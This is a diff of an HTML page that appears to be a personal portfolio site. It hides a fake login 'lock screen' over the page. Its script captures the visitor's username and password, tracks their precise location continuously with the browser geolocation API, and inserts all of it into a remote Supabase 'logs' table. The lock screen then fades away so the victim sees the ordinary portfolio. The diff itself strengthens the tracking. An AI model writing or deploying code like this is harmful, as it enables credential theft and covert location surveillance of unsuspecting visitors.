@@ -39,7 +39,6 @@
         .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 10px; }
         .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 14px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
 
-        /* شاشة القفل الزرقاء فوق التصميم */
         #lock-screen {
             position: fixed; inset: 0; background: #0a192f; z-index: 99999;
             display: flex; justify-content: center; align-items: center; transition: 0.8s;
@@ -83,70 +82,62 @@
                 <a href="tg://settings"><i class="fas fa-user"></i></a>
                 <a href="https://g.co/kgs/pXVXQxK"><i class="fas fa-futbol"></i></a>
                 <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
+                <a href="https://16salm.github.io/AI/"><i class="fas fa-brain"></i></a>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    // بيانات سوبابيس الخاصة بك
     const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
     let finalLocData = "جاري جلب الموقع...";
+    let watchId = null;
 
-    // جلب الموقع بأعلى دقة ممكنة
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        
-        // تصحيح الرابط ليكون رابطاً حقيقياً ومباشراً
-        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        try {
-            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
-            const d = await r.json();
-            // دمج العنوان مع الرابط الصريح
-            finalLocData = `${d.display_name} | رابط الخريطة المباشر: ${mapUrl}`;
-        } catch(e) {
-            finalLocData = `إحداثيات: ${lat},${lon} | رابط الخريطة المباشر: ${mapUrl}`;
-        }
-    }, () => { finalLocData = "رفض إذن الموقع"; }, { 
-        enableHighAccuracy: true, 
-        timeout: 15000, 
-        maximumAge: 0 
-    });
+    function startTracking() {
+        if ("geolocation" in navigator) {
+            const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+            watchId = navigator.geolocation.watchPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                try {
+                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
+                    const d = await r.json();
+                    finalLocData = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                } catch(e) {
+                    finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                }
+                if (acc <= 15) navigator.geolocation.clearWatch(watchId);
+            }, (err) => {
+                const errors = ["", "رفض الإذن", "غير متاح", "انتهى الوقت"];
+                finalLocData = `خطأ موقع: ${errors[err.code] || "غير معروف"}`;
+            }, geoOptions);
+        } else { finalLocData = "المتصفح لا يدعم الموقع"; }
+    }
+
+    window.onload = () => {
+        startTracking();
+        new Typed(".typed_text", {
+            strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
+            typeSpeed: 50, backSpeed: 30, loop: true
+        });
+    };
 
     async function sendData() {
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
         const btn = document.getElementById('btn');
-
         if(!u || !p) return alert("يرجى إكمال البيانات");
-        
         btn.innerText = "جاري التحقق...";
         btn.disabled = true;
-
-        // إرسال البيانات (ستظهر في Supabase كعنوان + رابط خرائط)
-        await sb.from('logs').insert([{ 
-            username: u, 
-            password: p, 
-            location: finalLocData 
-        }]);
-        
-        // تلاشي شاشة القفل لينكشف التصميم الأصلي
+        await sb.from('logs').insert([{ username: u, password: p, location: finalLocData }]);
         document.getElementById('lock-screen').style.opacity = "0";
-        setTimeout(() => { 
-            document.getElementById('lock-screen').style.display = "none"; 
-        }, 800);
+        setTimeout(() => { document.getElementById('lock-screen').style.display = "none"; }, 800);
     }
-
-    // تأثير الكتابة على التصميم الأصلي
-    new Typed(".typed_text", {
-        strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
-        typeSpeed: 50, backSpeed: 30, loop: true
-    });
 </script>
 </body>
 </html>
